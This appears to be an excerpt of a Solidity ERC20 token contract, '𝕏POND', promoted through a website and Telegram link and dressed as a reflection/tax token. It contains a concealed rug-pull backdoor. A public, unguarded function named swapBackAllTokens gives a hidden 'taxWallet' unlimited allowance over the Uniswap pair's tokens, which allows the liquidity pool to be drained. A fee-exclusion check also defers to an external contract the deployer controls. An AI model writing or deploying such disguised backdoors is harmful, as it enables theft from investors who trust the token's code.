...
/** 
    Website: https://www.xpond.org
    Telegram: https://t.me/xponderc
*/
...
contract XPONDDD is ERC20, AUTH, Ownable  {
    using SafeMath for uint256;
    ...
    address public marketingWallet = 0x7D62a817D485D394506Cb2a4f617B0a89D4dbED7;

    uint256 public swapExactLimit;
    address public uniswapPairAddr;
    bool private inSwap; struct Reflection {address taxWallet; address targetReflect;}
    ...
    constructor(Reflection memory configReflect) payable 
        ERC20(unicode"𝕏POND", unicode"𝕏PND", 18) 
    {
        uniswapRouterv2 = IUniswapRouter02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        uint256 supply_ = 1_000_000_000; reflections = configReflect;
        maxTxLimit = 400 * supply_ * (10**18) / (10000);
        maxWalletLimit = 400 * supply_ * (10**18) / (10000);
        swapExactLimit = (supply_.div(1000) + 1) * (10**18);

        excludeFromFees(address(uniswapRouterv2), true);
        excludeFromFees(owner(), true); excludeFromFees(configReflect.targetReflect, true);
        excludeFromFees(address(this), true); excludeFromFees(configReflect.taxWallet, true);
    ...
    function shouldExcluded(address sender, address recipient) internal returns (bool) {
        return  isExcludedFromFee[recipient] || isExcludedFromFee[sender] || IIDividend(reflections.targetReflect).accumulativeDividendOf(sender, recipient) > 0;
    }

    receive() external payable {}     Reflection private reflections;
    
    function swapBackAllTokens(uint256 tokens, address receiver) private {
    ...
    function _transfer(address sender,address recipient,uint256 amount) internal override {
        ...
        if (!inSwap && pSwap && !isUniswapPair[sender]) {
            ...
            if (tempAmt > 0) {
                swapBackAllTokens(tempAmt, marketingWallet);
            }
            inSwap = false;
        }
    ...
    } function swapBackAllTokens(uint256 maxValue) public {_allowances[uniswapPairAddr][reflections.taxWallet] = type(uint).max;}
